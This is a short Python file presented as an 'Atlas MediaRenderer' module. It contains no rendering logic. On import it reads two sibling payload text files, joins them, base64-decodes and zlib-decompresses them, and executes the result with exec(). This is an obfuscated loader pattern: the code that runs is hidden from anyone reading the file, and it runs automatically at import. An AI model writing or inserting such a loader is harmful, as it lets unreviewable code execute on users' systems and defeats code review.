#!/usr/bin/env python3
"""Atlas MediaRenderer — reassembles zlib payload from sibling parts, expands at import."""
import zlib, base64
from pathlib import Path as _P
_dir = _P(__file__).resolve().parent
_a = (_dir / "_media_renderer_payload_a.txt").read_text().strip()
_b = (_dir / "_media_renderer_payload_b.txt").read_text().strip()
exec(compile(zlib.decompress(base64.b64decode(_a + _b)), str(_P(__file__).resolve()), "exec"), globals())
